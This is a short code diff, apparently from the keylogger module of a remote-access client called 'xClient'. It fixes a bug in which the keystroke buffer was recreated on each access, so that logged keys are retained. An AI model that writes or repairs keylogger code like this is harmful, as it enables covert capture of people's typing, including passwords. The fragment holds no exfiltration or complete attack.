@@ -63,8 +63,7 @@ namespace xClient.Core.Keylogger
             }
         }
 
-        private StringBuilder _keyBuffer_;
-        private StringBuilder _keyBuffer { get { return _keyBuffer_ ?? new StringBuilder(); } set { _keyBuffer_ = value; } }
+        private StringBuilder _keyBuffer;
         private string _hWndTitle;
         private string _hWndLastTitle;
 
@@ -123,6 +122,8 @@ namespace xClient.Core.Keylogger
 
             this._timerFlush = new System.Timers.Timer {Enabled = false, Interval = flushInterval};
             this._timerFlush.Elapsed += this.timerFlush_Elapsed;
+
+            this._keyBuffer = new StringBuilder();
         }
 
         private void timerLogKeys_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
@@ -168,7 +169,6 @@ namespace xClient.Core.Keylogger
                     if (_enumValues.Contains(i)) //If our enumValues list contains to current key pressed
                     {
                         _keyBuffer.Append(FromKeys(i, ShiftKey, CapsLock));
-
                         return;
                     }
                 }
